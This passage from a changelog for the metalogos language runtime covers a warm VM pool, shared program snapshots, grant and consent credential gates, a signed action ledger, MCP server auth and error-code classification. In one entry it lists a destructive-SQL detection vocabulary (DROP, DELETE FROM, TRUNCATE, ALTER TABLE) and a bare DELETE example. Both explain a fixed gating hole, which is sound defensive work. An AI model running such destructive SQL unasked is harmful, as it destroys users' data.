after reset) and reset repeatability. HTTP-level contract tests (`tests/naryad_403_vm_pool.rs`) pin the client-visible surface with pool capacity 1: sequential requests each see ONLY their own in-memory db row (a leaked row would make the granted bare-DELETE wipe 2, not 1), a fresh N(1) grant per request with the exhausted re-use refusing through the #392 deny path, the ledger surface and the query context per-request; the fail-closed discard is proven by the pool's own counters (`reuses`/`cold_created`/`discarded_error` — the honest-reporting surface), TW↔VM parity holds on the security fixture with the pool ON, and pool OFF (the default) is behaviorally unchanged. **Finding**: the #40-era comment "Vm is !Send, so we cannot store it in ServerState" was stale — `Vm` IS `Send` (every field is owned or `Mutex`/`Arc`; `rusqlite::Connection` is `Send`), verified by a compile-time probe in `vm_pool.rs` that pins the pool's threading assumption permanently. **Config (the decision recorded in ADR-0141)**: `METALOGOS_VM_POOL=1` enables (read once at startup, the #263 read-once discipline), `METALOGOS_VM_POOL_MAX` caps the idle set (default 8, beyond-capacity checkins are dropped — no unbounded growth); the DEFAULT IS OFF (opt-in) until the #404 re-gate makes the flip decision with pinned evidence. **Honest delta** (indicative, debug profile, sequential minimal-route GETs, one box): 1090 → 895 µs/request (~195 µs saved, 1.22x) — that is the `Vm::new` share the pool removes; release-profile numbers and the flip decision belong to the #404 re-gate protocol (3x pinned).

- **VM-serve divisor step A — the per-request `load_program` deep copies eliminated via Arc-shared immutable snapshots (naryad #402, issue #525, wave-4 dispatch #529)**: the №388 Stage-5 evidence mislabeled the serve path's per-request `p.clone()` — `ServerState` has shared the compiled program as `Arc<Program>` since №40 (one atomic increment, never a deep `Program::clone`); the REAL per-request program-state cost lived inside `load_program`, which deep-copied the global names, the deny handler table, the `RegisterPattern` scan (one `CompiledFn` clone per pattern), the rules table PLUS a priority sort, and the skill indices on EVERY request. Step A eliminates exactly that: `Program::shared_cache` (bytecode.rs) holds lazily-built immutable `Arc` snapshots — rules pre-sorted, patterns pre-scanned, deny handlers, skill indices, global names — built ONCE per program and installed by `Vm::load_program` as one-increment Arc clones; the run()-only `RegisterPattern` mutation goes through `Arc::make_mut` (copy-on-write, the serve path never pays the copy); per-request globals (mutable execution state), the server context injections (body/query/path/roles — AFTER load_program, the isolation boundary unchanged), the db connection and reflex/vision model construction stay per-request by design. Behavior pinned by `tests/naryad_402_step_a.rs` (TW/VM route-result identity on a grants+deny+ledger route, cross-request query-context isolation, the per-request signed trail verified externally). **Delta measurement** (protocol №398, divisor declared = corpus route count 14, rounds 12, one box, raw numbers): VM request-cycle mean 11626/13110 µs on base (main `03499fd`, two runs) → **5919 µs** on step A (`cbbb980`) — **~2.2–2.4× per-request VM-cycle reduction**; interpreter side unchanged (22.1–22.4k µs, noise); RSS ratio 1.06–1.10 (unchanged). The remaining per-request costs are anchored in `execute_route_body_vm` for №403 (warm pool) / №404 (the 3×pinned re-gate): `Vm::new`, the globals allocation, reflex/vision construction when declared, the db open, and the route execution itself. Finding during the pin test (pre-existing, unrelated to step A): a route body cannot use `from <origin> media_store_*` on the TW backend — `clone_definitions_into` never copies the origin declarations to the per-request interpreter (VM side is unaffected) — reported separately.

- **Gate parity follow-up — the destructive-SQL vocabulary and the VM journal record (naryad №397 follow-up, dispatch issue #491)**: an independent re-execution of the №397 kitchen-camera e2e (PR #541 — superseded by the merged wave-3 implementation, #531/#533/7a98865) surfaced two defects the merged coverage could not see. (1) **Static gate vocabulary** (`src/semantic.rs`): the irreversible-content matcher covered only `drop table|drop database|drop index|truncate` while the audit doc comment (audit.rs), REFERENCE.md and the runtime twin (`grants.rs::extract_destructive_ops`) claimed DROP/DELETE/TRUNCATE/ALTER — a bare `db_execute("DELETE FROM …")` compiled clean and executed UNGRANTED (the bare runtime path trusts the static gate; there is no second runtime gate on it). `delete from`/`alter table` now gate at compile time; the stale №152 check realigned (`tests/check_integration.rs`: the SQL_DYNAMIC intent preserved on a non-destructive literal, the destructive literal carries the layered grant contract — `n397_destructive_literal_needs_a_grant`). (2) **VM journal parity** (`src/vm.rs`): the VM's granted destructive-SQL success path wrote `grant.used` but skipped the `irreversible.db_execute` journal record the TW path writes (`src/interpreter/db.rs`) — the signed trail on the VM backend missed the action itself; the merged e2e could not see it because TW and VM records share one process ledger and the chain-content assertions were not per-run (the TW record satisfied the VM run's assertion). The VM record now mirrors the TW detail format (grant_id|scope|sql, SHA-256 only). Evidence: `tests/naryad_397_followup_gate_parity.rs` (2 tests — the per-RUN VM delta on the merged e2e scenario + external verification of the VM-era export; the full-vocabulary static-gate matrix with the granted path staying legal). README anchors resynced (200 test files).

- **The consent RUNTIME credential — the static and runtime gates agree on the consented media egress (naryad №397 delta, dispatch issue #491)**: the kitchen-camera e2e integration exposed a layer disagreement the per-layer tests could not see — the static audit accepted a consent scope as the `media_save` credential (№387 generalized egress: `n387_consent_path_green_for_media_save`), while the runtime backstop knew only the №387 likeness token, so a consent-clean compile was SEALED at runtime (`MEDIA_SEALED_EGRESS`) — a statically-legal program that always dies, violating the №328 agreement principle; the acceptance's green consent path (origin → consent → egress of private media) could not run end to end. Fixed by store-aware consent interception: `consent_grant_dispatch`/`consent_revoke_dispatch` (`src/builtins/consent.rs`) record the scope ON THE STORE ENTRY (`MediaStore::extend_entry_consent`/`clear_entry_consent` — the ConsentScope meet, the same operation the static №335 rule applies; capabilities accumulate) at the TW statement path, the TW expression path and the VM's `call_media_builtin`; the consent-ledger record and the pass-through are unchanged. The `media_save` backstop honors a consented entry (the runtime twin of the static consented-egress rule); `consent_revoke` withdraws the runtime credential (the runtime twin of the flat cascade — the entry re-seals); quarantine materializes through NO sink (the runtime twin of ADR-0154 §2.1). The №387 likeness token remains an independent credential — both paths now agree with the static gate. Credential matrix §2.9: the Consent-scope row notes the runtime mirror (no new credential style). Evidence: `tests/naryad_397_consent_runtime_credential.rs` (4 tests — the green path on BOTH backends with the sidecar-manifest facts, the unconsented refusal, the revoke twin at store and language level, the canonical deny sharing the №392 deny-reason dictionary). REFERENCE truth-up (`media_save` two-credential gate, `consent_grant`/`consent_revoke` runtime semantics + the frozen classification block); README anchors (197 test files).

- **Docs truth-up — the limitations lag closed + live external MCP-HTTP verification (naryad #401, issue #524, audit 2026-09-19 P0-2/P1-1/P1-2/P2-1)**: the four docs drifts the external audit confirmed on `29de25a` are fixed against live main `2618673a`. (1) `docs/limitations.md` Error Protocol: the stale «`code` carries the generic `RUNTIME_ERROR`» row now reflects №385/ADR-0169 — the frozen origin-stamped set (`LLM_TIMEOUT`, `LLM_PROVIDER_UNAVAILABLE`, `SQL_ERROR`, `SANDBOX_VIOLATION`, `SINK_CLEARANCE_RUNTIME`, `MEDIA_SEALED_EGRESS`, `BACKEND_DEGRADED`) classified ONCE per caught error by the origin stamp at position 0, never by message text, with the honest fallback boundary named (unstamped origins — API-arity refusals, lock poisoning, generic HTTP status answers — stay `RUNTIME_ERROR`; widening the stamp surface is incremental and explicitly not a blocker, audit P2-4). (2) The MCP section drops «stdio-only»: `mlog mcp-serve --transport stdio|http|sse` is in main (№394/ADR-0168), and the row records the first-stage auth boundary from LIVE external verification — Bearer per request (`--auth-token`/`METALOGOS_MCP_AUTH_TOKEN`, 401 on mismatch) or a token-less localhost-only bind with the loud posture line, `0.0.0.0` without a token is a loud WARNING (never a silent open port), no built-in TLS/multi-tenant identity yet (reverse-proxy territory). The section also honestly records the boundary the verification surfaced: tool methods execute on the TW interpreter, so the `SINK_CLEARANCE_RUNTIME` backstop is VM-side and the №259 env gate is serve-route-scoped — the compile-time gates (`IRREVERSIBLE_NO_GRANT`/`SQL_DYNAMIC` via `mlog check`/`mlog serve`) plus the `tools/list` policy disclosure are the main line; the runtime posture for tool methods is the open decision gh#536 (filed with live evidence). (3) ADR-0155 Status → **Implemented** with anchors: the grant algebra (№389–№393: `grant_issue`/`grant_subgrant`/`grant_revoke`/`grant_use`/`db_execute_with_grant`, the bridge, DenyEvent, the signed ledger) is in main, independently accepted by the wave-3 audit and the external audit, exercised end-to-end by the kitchen-camera e2e and the #395 dogfood. (4) REFERENCE gains **§2.9 — the opaque-credential matrix** (№401): consent scope (label component; not linear; `consent_ledger`) × LikenessToken (`Value::LikenessChallenge`/`Value::Likeness`; linear ritual; consent ledger + Action Ledger) × Grant (`Value::Grant`; once/n/unlimited; signed Action Ledger v1) under one principle — a new credential is added ONLY through this matrix with an ADR, never as a fourth ad-hoc style (audit P2-1); threat-model carries the threat view (capabilities stay out of the data plane, use is attributable). (5) The **MCP-HTTP external verification itself** (protocol in gh#488): a raw JSON-RPC client (no MCP SDK) drove the REAL `mlog mcp-serve` release binary — fail-closed start without `--allowlist` (exit 1, loud), the 401 matrix (missing/mismatched Bearer), `initialize` (protocolVersion 2024-11-05), `tools/list` with the compiled policy pinned per tool (`sink_calls`, `clearance_args`, `irreversible` from the №316 SSOT), `tools/call` (clean call, bare-name allowlist hit, unknown tool `-32602`, exec-gate `EXEC_NOT_PERMITTED` refusal) over http AND stdio, and the full SSE round-trip (endpoint event → `POST /mcp?session=…` → 202 → the JSON-RPC response delivered on the session stream); №394 invariants green on stdio AND http (the in-repo suite 8/8 on this main). README reverse-bridge sentence truth-up (`mcp-serve` is live, not a future direction) + anchors resynced.

- **Wave-3 acceptance item 1 — the kitchen camera end-to-end under the capability layer, plus the ledger genesis-seq defect it caught (dispatch №397, gh#491)**: the four wave components (`w1_kitchen_camera`, `w2_grant_linear`, `w2_deny_exhaustive`, `w2_ledger`) are combined into ONE running story — `examples/w2_kitchen_camera_capability.mlog` (+ golden): a private kitchen-camera frame is captured with declared provenance (№331 origin chain), the №387 likeness ritual issues the one-time credential (the consent-ledger grant recorded by `likeness_verify` itself) and the seal unseals for that single `media_save` (the GREEN consent path — allowed), the archive cleanup is destructive SQL metered by a linear N(1) grant (№390/№391 — the granted call runs and journals itself), and the exhausted quota refuses (GRANT_EXHAUSTED → the typed reason `IRREVERSIBLE_NO_GRANT`) while the `on_deny(db)` handler explains the refusal and the call degrades to Unit (the №392 DENY path — the refused DELETE never runs). Every event is a SIGNED ledger side effect of the action path itself (№393/ADR-0167 §3.4 — no "also log it" call in the program); the flow exports BOTH ledgers (the consent JSON + the verifiable JSONL chain) for external verification. Evidence: `tests/wave3_kitchen_camera_e2e.rs` — TW + VM parity on the whole story, the exported chain verified by the pure external verifier (`ledger::verify_file`, the check `mlog ledger verify` performs), the chain content pinned (`grant.issued` / `irreversible.db_execute` / `deny.IRREVERSIBLE_NO_GRANT`) and the consent export pinned to the ritual's grant record. **The defect the e2e caught (FIXED in the same change)**: the runtime ledger numbered its first record `seq = 1` (`head_seq + 1` over a 0-initialized head) while ADR-0167 §3 pins genesis at `seq = 0` and the external verifier refuses any non-snapshot start above it — a fresh process's own export could NEVER pass `mlog ledger verify` (the №393 contract tests built chains manually at seq 0 and never exercised the runtime-export → verify round-trip; the `w2_ledger` example's verify claim was aspirational for the fresh-process case). Fix: `head_seq: Option<u64>` (`None` = the empty chain sits at the genesis position) — the first append takes seq 0, in-process re-init recovery and rotation seams unchanged, all 12 `naryad_393_ledger` contract tests green unchanged. This unblocks the №395 dogfood criterion "every irreversible action has a ledger record verifiable by the external verifier" for fresh-run deployments. The wave-4 naryad №400 letter (bug gh#521) is closed by the follow-up contract pin `n400_runtime_journal_roundtrip_verifies_from_genesis_without_anchor` — the runtime journal (`append_record` × N over the process's own records) round-trips `records_to_jsonl → records_from_jsonl → verify_records` from genesis seq 0 with NO anchor, and `ledger_count()` stays a plain row count agreeing with the chain numbering. README anchors resynced (246 examples, 195 test files).

- **SMFS spike prototype lands in main — memory as a virtual read-only FS (naryad #282, issue #331, PR #349)**: the Tier-3 spike was verdict **GO** (report `docs/research/naryad-282-smfs-spike.md`, base `8fb59bf`, Go criterion 3.66× context reduction ≥ 2×) and, by the owner's explicit decision, the prototype itself now lands in main (the original spike protocol — лекало №271 — kept it branch-only; the landing is a deliberate deviation recorded here). `src/builtins/smfs.rs` mounts a virtual read-only `sm:` space on top of the kv memory store, reachable through the STOCK file builtins (`read_file`/`list_dir`/`file_exists`) via interception in `src/builtins/io.rs` BEFORE `sandbox_path` — no sandbox extension, no registry changes (457 builtins unchanged), no file-builtin arity changes, invisible to bytecode indexes. Path matrix: `sm:` lists kv DBs, `sm:<db>` lists containers, `sm:<db>/<container>` lists `profile.md` + buckets, `sm:<db>/<container>/profile.md` renders the deterministic #281 digest (keys + first 160 chars + `(full: sm:…)` pointers), deeper paths return the byte-exact value (missing = soft `""`, №254 contract); ANY write/append/delete to `sm:*` is loudly `[SMFS_READ_ONLY]` (reads are FS-native, writes stay with the memory API — the dual-writer channel is refused by design), malformed forms are `[SMFS_BAD_PATH]`, `..` is `[SANDBOX_VIOLATION]`, and the active-sandbox gate `forbidden=["filesystem"]` (№131/№252/№254 contours) sits BEFORE the interception and cuts the six file builtins regardless of prefix (`sandbox_forbidden_filesystem_beats_smfs`). Two-way prefix reservation: real `sm:*` files are unreachable and uncreatable through the builtins. Evidence: `tests/naryad_282_smfs_spike.rs` (13 tests — the full matrix above, TW↔VM parity for `sm:` reads, canary detection surviving an SMFS export, the Go-criterion demo measurement pinned in-test). No new dependencies; the merge commit resolves the `builtins/mod.rs` overlap with №285's `text_chunk` (both modules coexist, comment actualized to the owner's landing decision). README test-file anchors resynced (192→194).

- **Stage 5 evidence — the per-request divisor confirmed, NOT flip-ready, the elimination ADR-proposal (naryad #388, issue #482)**: the re-gate entry №381 asked for — (1) **the divisor is confirmed at CODE level**: after startup route compilation, `execute_route_body_vm` still pays `Program::clone()` + `Vm::new()` + `load_program()` per request (the `'static + Send` spawn_blocking closure) and the TW twin re-clones definitions per request (`clone_definitions_into`) — the №40 startup compilation amortized the compile, not the state construction; (2) **three consecutive pinned-runner benchmark runs** (stage4-benchmark.yml, rounds=30, main @ 307f506, all success — runs 35366524331 / 35367692167 / 35368447002): p95 speedup ×1.66 / ×1.62 / ×1.48, RSS ratio VM/TW 1.10 / 1.09 / 1.12 — both re-gate thresholds (p95 ≥ ×1.5, RSS ≤ ×1.1) hold on TWO of THREE runs and fail on the third → **verdict: NOT flip-ready**, the ratio stays inside the scheduler-noise band (+24–29 %, №381/№398) until the per-request cost is removed; (3) **the ADR-proposal (NO implementation)**: `docs/research/naryad-388-stage5-evidence.md` §4 — two separately-scoped changes: the program cache (`Arc<Program>` — the clone becomes an Arc increment; risk LOW, the program is immutable post-startup) and the warm VM pool / definition-cache (risk MEDIUM — cross-request state leakage is a security regression, the reset protocol must be contract-tested fail-closed; the №381 shared-DB bug is the cautionary precedent); (4) **soak evidence**: `soak.yml` cron active, **3 green nights** (2026-09-16/17/18); (5) the WARN-actualization small diff (task 4): ADR-0105 → ADR-0141, the word *experimental* removed (opt-in backend; full-language parity Stage 1–2 closed; the default flip gated by ADR-0141 Stage 4/5 on soak + real-load evidence — the current process, not the closed gh#446 NO-GO). The N-run protocol (≥3 pinned runs, artifacts per run) is executed as part of this naryad; the re-gate decision stays with the owner. Documentation + a 20-line WARN/comment diff — zero behavior change.

- **LikenessToken — the opaque consent credential for likeness egress (naryad #387, issue #481, ADR-0149 D1/D6)**: the V6-deferred token mechanics land as the third legal credential for private/camera-origin media egress beside the public label and the №335 consent scope. **The token is NOT a String** (the P1-7 unforgeability contract): `Value::LikenessChallenge`/`Value::Likeness` are new opaque variants (the №390 GrantHandle pattern — serde emits dead `[LIKENESS_TOKEN]` markers, Display is bracketed, non-printable), minted ONLY by the ritual — `likeness_challenge(subject, scope?, ttl?)` issues a one-time challenge, `likeness_verify(challenge, subject?, scope?)` consumes it linearly (replay = typed `LIKENESS_VERIFY_FAILED`), records the consent-ledger grant (the №335 trace) and returns the token; a String in the challenge or credential position never verifies. **Static gate `VIDEO_LIKENESS_NO_CONSENT`** (Category A, no profile downgrades a deepfake gate): `video_render` with an I2V reference (positions 2/3) resolving — directly or through a let-alias chain — to a `kind: "likeness"` origin requires a bound `likeness_verify` result BEFORE the call site (presence-based, the D2 honest boundary; order-sensitive; branch/loop-bound tokens do not escape their fork — fail-closed). **Generalized media egress**: the №325 walk threads a FlowCtx (var → origin-kind alias map + token-presence flag) so `media_save` accepts a private camera/likeness-origin handle with a non-empty consent scope OR the ritual credential; the kitchen-camera deny, the poisoned refusal and every other sink are UNCHANGED, and the runtime `MEDIA_SEALED_EGRESS` backstop holds — non-public saves now unseal ONLY with the token passed as the third argument (`media_save(handle, path, token)`), verified against the likeness registry (forged ids refuse). `kind: "likeness"` joins the origin vocabulary (file-backed capture when `path` is present; the ProvBind construction needs no file). Registry 455→457 (append-only, `security` category); the №316 classification SSOT regenerated. Examples: `w1_likeness_token` (green e2e — challenge/verify → token save → honest C2PA-style sidecar manifest), `w1_kitchen_camera_alias` (red — a 3-deep let-chain never detaches the private label). Leak corpus: `n387_likeness_video_no_token` (VIDEO_LIKENESS_NO_CONSENT) + `n387_likeness_save_no_token` (SECRET_LEAK). Evidence: `tests/naryad_387_likeness_token.rs` (20 tests — unforgeability, linearity, serde markers, the gate red/green matrix incl. order-sensitivity and branch-escape conservatism, alias invariance, the runtime unseal/refuse/forged triplet, the kitchen-camera regression pin). REFERENCE §3/§6 + limitations + threat-model resynced; README anchors resynced (457 builtins / 245 examples).

- **Executable architecture contracts — `tests/architecture_contract.rs` (naryad #382, issue #502, idea A10)**: the ADR culture gets mechanical enforcement after the donor reference (memorax-code `ARCHITECTURE.md` §5.2–5.3, "do not weaken a boundary to get a green build"): a std-only test (zero new dependencies, source scan only, 0.2 s runtime) walks `src/` + the root `Cargo.toml` — parses `use crate::…` (incl. group forms), `pub use`, `use super::…` (resolved to the top-level module) and bare `crate::head` mentions — and pins six contracts: **C1** the root crate never depends on the satellite crates (`mlogpkg`/`mlog-lsp`; manifest sections + source-mention scan; the allowed direction is satellites → `metalogos` only), **C2** `builtins` and **C3** the execution core (`vm`/`interpreter`) never touch transport (`server`/`mcp_server`; the media-handle re-exports in `interpreter/values.rs` are data, not transport), **C5** the frontend (`parser`/`ast`) never touches transport, **C6** the provenance substrate (`ledger`/`consent`) stays below the builtin surface and transport, and **C4** the acyclicity ratchet: the file-level `crate::` graph (Tarjan SCCs over 149 files / ~310 direct edges at `c60651b`) carries exactly two frozen cycles — {`ast`, `builtins/mod`, `bytecode`, `interpreter/mod`, `llm`} and {`audit`, `semantic`} — with their exact intra-cycle edge sets; a NEW cycle or edge is red, and so is the silent disappearance of a frozen one (compression is welcome but loud: `FROZEN_SCCS` is updated in the same PR). A meta-guard test pins the anchors (key module files, head resolvability, workspace members line, scanner sanity ≥100 files / ≥100 edges) so no rule can pass vacuously. The honest scanner boundary is documented in the test header (no macro expansion, no build.rs analysis, no cfg-feature graph, no transitive deps — cfg-gated edges still count, string literals not parsed; not a cargo-deny replacement). The naryad's pre-scan inventory (2026-09-16) was honestly refreshed on HEAD: the interpreter↔nn cycle no longer exists at file level, while `llm.rs` and the audit↔semantic pair joined the frozen set. Mutation-verified (report in the issue): 8 injections — one per rule, plus the C4 edge ratchet, plus the cargo-level cycle refusal — all red naming the rule; clean tree green.

- **Benchmark run protocol — the five mechanical rules + fail-closed runner + first executed series (naryad #398, issue #501)**: the direct answer to №381's INSUFFICIENT DATA — `docs/benchmark-protocol.md` fixes the run contract verbatim: (1) fixed run command, only committed code varies between runs (no env flags, no mid-series edits); (2) the normalization divisor is declared BEFORE the run and printed with RAW and normalized numbers (a divisor may not absorb the raw ones); (3) frozen variants — any answered run is final, error-runs that do not answer the hypothesis count as repairs; (4) repair cap 2 per node, stop after 3 consecutive failures per direction; (5) stacked bushes — fans only within one decision, the tree (parent→child) is fixed in the report. `scripts/bench_run.sh` enforces the contract mechanically for the Stage 4 benchmark (refuses an undeclared divisor, prints `RAW | DIVISOR | NORMALIZED`, appends the run-tree log). **First series executed**: decision "does 60 rounds vs 30 change the measured cost" — variant A (main, 30 rounds: interpreter 20505 µs/cycle raw, vm 11363; normalized /14 routes = 1464.6 / 811.7) vs variant B (committed 60-rounds branch: 25405 / 14708; 1814.7 / 1050.6); tree `root → rounds30-main ; root → rounds60-varB`; verdicts: A promote-as-baseline (after 2 wrapper repairs — rule 3 in action), B stop (cross-run noise dominates: +24…29 % between runs regardless of round count → the Stage 4 re-gate stability requirement is a pinned-runner property). Series record: `docs/research/bench-protocol-first-series.md` + `docs/research/bench-tree.log`.

- **Public draft: Action Provenance Ledger — a profile over in-toto / W3C PROV (naryad #396, issue #490)**: the ledger v1 design (ADR-0167 + the ADR-0157 mappings) is now written up for external review — `docs/research/action-provenance-ledger-draft.md` (English-only per the owner directive): the native record model (fields, canonical body, the six chain rules including signer continuity), the in-toto ITE-5 profile (fixed versioned `predicateType`, every native field preserved in `predicate`, the subject digest = the args commitment), the PROV-JSON linear-activity-lineage profile (one declared `metalogos:` namespace), the honest threat boundary (tamper-EVIDENT not tamper-PROOF — out-of-band head/key anchoring is the answer; args preimage not stored; metadata-only confidentiality), positioning against SLSA (orthogonal), CycloneDX (no per-action trail document type — in-toto chosen) and OWASP agentic guidance (the audit trail the guidance calls for), a REAL worked corpus — the 20-record `w2_ledger` chain (grant → granted destructive SQL → deny → rotation → snapshot, records verbatim, synthetic dogfood data) plus the blocking 10k-record CI golden for scale — and the prepared liaison letter (§10) with concrete compatibility questions for the in-toto/SLSA/PROV communities and the target channels. Per the naryad: SENDING the letter is deliberately NOT part of this naryad — publication happens by the owner's explicit instruction; the Responses section (§11) is opened and will record each external comment with its accepted/rejected rationale. Documentation-only change; docs_language_lint/consistency gates green.

- **Cross-module persistence taint — memory-key summaries (naryad #386, issue #480)**: the `TAINT_PERSISTENCE` Category-A gate now sees across module boundaries. `PatternSummary` (the №376 interprocedural summary) is extended with `tainted_memory_keys` / `writes_tainted_memory` — computed in `compute_pattern_summaries_with_depth` for every `memorize(<key>, <LLM-derived value>)` (sanitizer-wrapped stores are not tainted). A content-fingerprint-keyed module registry (`MEMORY_TAINT_REGISTRY`, bounded at 4096) accumulates each audited module's keys; when a module's `recall(<key>)` result reaches `respond()`/`respond_html()` and the key matches ANOTHER module's recorded key/prefix, the finding fires with the SAME `TAINT_PERSISTENCE` class, naming the matched key and the writer scope. Honest boundary (limitations.md + threat-model resynced): dynamically constructed keys without a leading string literal are not matched — full points-to is a later phase. Optional strict mode `METALOGOS_TAINT_STRICT=1` (default OFF) flags ANY recall→sink flow when another module writes LLM output to memory at all. Why a registry beside the №376 cache: the cache is keyed by the source-string hash, and the compile/run paths pass an empty source (entries would collide/overwrite); the fingerprint is content-derived and stable per module. Overhead measured on the 2344-line production fixture: within noise (~1.62 s with vs without, cold registry). Evidence: `tests/naryad_386_taint_cross_module.rs` (10 tests — red/green cross-module pair with key+writer named, unrelated-key green, sanitize-before-store green, prefix matching, the dynamic-key boundary, strict on/off, in-slice cross-pattern, the №376 cache contract, the registry clear hook), leak corpus `examples/leak/n386_a_writer`/`n386_b_reader` (red pair; the runner's sorted walk seeds the registry) + `ok_386_redact_store`/`ok_386_plain_memory` (BLOCKING green), `n325_leak_suite_corpus_is_closed` now walks the corpus in the same deterministic sorted order as the runner.

- **Stable `try` error codes — origin-stamped classification (naryad #385, issue #479, ADR-0169)**: `try.error.code` is no longer a constant — the three sewing points (TW `Expr::Try`, VM `Instruction::TryEval` in both dispatch arms) classify every caught error through ONE shared function (`values::stable_try_error_code`), so the interpreter and the VM cannot disagree (parity by construction, guarded by the crosscheck gate). **Classification is by ORIGIN STAMP, never by message prose**: the failing subsystem stamps the error where it is born (`values::coded_error` → the unified loud `[<CODE>] ` format, generalizing №254's `[SANDBOX_VIOLATION]`; `MEDIA_SEALED_EGRESS: …` reformatted into the same bracket form — `contains`-based consumers unaffected), and the classifier reads only a strict whitelist at position 0 (a `[CODE]`-looking substring mid-message is content — a program cannot forge a classification). **The frozen set** (ADR-0131 contracts): `RUNTIME_ERROR` (honest fallback — unstamped origins: API-arity refusals, db lock poisoning, HTTP status answers, transport failures of other subsystems), `LLM_TIMEOUT` (reqwest `is_timeout` + the №248 deadline contours, stamp preserved through the legacy wrapper), `LLM_PROVIDER_UNAVAILABLE` (`is_connect` + SmartRouter circuit-open exhaustion — no rung attempted, or the last error's own stamp promoted to the front by `wrap_error_preserving_code`), `SQL_ERROR` (every rusqlite-origin site in BOTH `interpreter/db.rs` and the VM's duplicated dispatch arms — one `sql_err` helper, parity intact), `SANDBOX_VIOLATION` (№254, unchanged format), `SINK_CLEARANCE_RUNTIME` (the №325 runtime twin), `MEDIA_SEALED_EGRESS` (№325/ADR-0162), `BACKEND_DEGRADED` (№336 — stays a TYPED `Degraded(t)` result whose `error.code` reuses the same frozen constant). **Deterministic fault seam** `METALOGOS_MOCK_LLM_FAULT=timeout|unavailable` (mock path; invalid values fail CLOSED with a loud error) exercises the LLM codes offline — golden examples declare it via an `examples/X.env` sidecar honored by BOTH the golden runner and the crosscheck (the parity gate compares the fault-injected run on both backends). The `message` field keeps the full original text (stamp included) — message-reading consumers are unaffected. Evidence: `tests/naryad_385_try_codes.rs` (13 tests — exact code + TW↔VM equality per subsystem, the honest fallback, the fail-closed seam, the message contract, the deadline origin stamp, the position-0 runtime-sink stamp), goldens `w385_try_sandbox/sql/fallback/llm_timeout/llm_unavailable/media/backend_degraded` (7 codes green on both backends) + `w385_office_branch` (criterion (д): the office policy branches by CODE — retry the timeout, hard-fail the sandbox violation — through the sanctioned №327 `redact(…, "hash_only")` decision lift, never substring-matching the message). REFERENCE §3 gained the code table + branching example (doc-test executed); REFERENCE §1 gained the `METALOGOS_MOCK_LLM_FAULT` env row. Registry untouched — 455 builtins, zero new crates.

- **README truth-up post-0.20.0 + `docs_consistency` CI gate (naryad #384, issue #478)**: the external engineering guide (2026-09-17) flagged a docs drift — `docs/limitations.md` honestly marks the VM Stage 1 gaps and the adapt-metric CLOSED, while README still carried stale claims. **Section "Dual Execution Backend"** rewritten to the facts: all VM Stage 1 gaps CLOSED (№369–№372: `Match`/match-as-value, `BlockIfElse` if/else-as-value, binop coercion with TW-identical messages, shared PRNG, Bool→String), the `crosscheck_backends` parity gate (№373) + nightly soak hold TW↔VM parity, `mlog serve` stays on the interpreter by default with the VM opt-in (`METALOGOS_SERVE_BACKEND=vm`, loud WARN) and the default flip gated by ADR-0141 Stage 4/5 (real-load numbers + owner decision); ADR-0141 is now the primary reference (ADR-0105 demoted), `docs/limitations.md` named as the maintained source of truth. **Section "Self-Modification"** rewritten: since №375 (ADR-0112 addendum) the `adapt`/`mutate` quality metric is REAL in real mode — a golden-task battery (eval datasets + pre-mutation few-shot, held-out split, deterministic order, the pattern's actual LLM path) drives keep/rollback (< 20 held-out → loud BELOW-MINIMUM; no held-out evidence → 0.0); the 0.95 stub remains ONLY in mock mode (`METALOGOS_MOCK_LLM`, loudly documented at the call site); the exhausted "Revisit point (2026-09-10)" paragraph removed. **New mechanical gate** `tests/docs_consistency.rs` (std-only, the `readme_consistency` pattern; 8 tests): (а) README never says "not supported yet" next to a VM feature limitations.md marks CLOSED; (б) every README 0.95 claim carries the mock-mode caveat; (в) the Dual Backend section names the parity gate, ADR-0141, the serve opt-in and the default posture; plus source-of-truth pins (limitations.md keeps its CLOSED rows) and mutation checks — the linter is RED on the exact verbatim stale lines this naryad removed. Grep contract: `rg "not supported yet|mock value \(0\.95\)|experimental for full-language" README.md REFERENCE.md` → 0 hits. Honest lines intentionally untouched (JIT scaffold ADR-0073, `authenticate` mock note, 0.95-in-example-data). Numeric anchors unchanged — `readme_consistency`/`reference_consistency` green.

- **MCP server — tool-policy compiled from the profile + HTTP/SSE transports (naryad #394, issue #488, wave 3)**: the server half of the MCP contour (ADR-0168 extends the client ADR-0132 with an explicit "+server transport" scope). **Transports**: `mlog mcp-serve --transport stdio|http|sse` — stdio (default) is byte-identical to №297; `http` serves JSON-RPC over `POST /mcp`; `sse` implements the MCP HTTP+SSE shape (`GET /sse` → `endpoint` event → `POST /mcp?session=…` → 202 → responses as `message` events on the session stream); `--bind` (default `127.0.0.1:8770`); http/sse run on the already-present axum/tokio stack (feature `server`, default-on) — **zero new compiled crates** (`futures-util` moves from transitive to a declared optional dep for honest accounting). **Security without weakening, by construction**: one `McpServer::handle_request` core serves every transport — allowlist fail-closed (empty = refuse, №297), unknown-tool `-32602`, exec/env gates, label clearance and taint rules are transport-blind; bearer auth (`--auth-token` / `METALOGOS_MCP_AUTH_TOKEN`) gates every request with 401 on mismatch, a token-less loopback bind is the accepted alternative and a non-loopback bind without auth is a loud WARN (the №263 posture). **Tool-policy compiled, not authored** (`src/mcp_policy.rs`): each `tools/list` entry carries `_meta["metalogos.dev/policy"]` — `sink_calls` (№316 Role::Sink + `audit::sink_kind` classes), `clearance_args` (params lexically flowing into sink arguments), `irreversible`, `source_calls`, `unclassified` — derived from the method-body AST over the SSOT classification; the policy annotates, the allowlist alone publishes. Evidence: `tests/naryad_394_mcp_server.rs` (8 tests) — an external JSON-RPC client walks `tools/list`/`tools/call` over HTTP, the SSE session stream delivers the tool result, the bearer matrix (401/401/200 + SSE 401) and the exec-gate refusal are green, the policy block is pinned for sink-class/clearance-args/irreversible; REFERENCE §1 gained the `mcp-serve`/`ledger` CLI rows, the env-var rows (`METALOGOS_MCP_AUTH_TOKEN`, `METALOGOS_LEDGER_KEY`) and the MCP-server contract table.

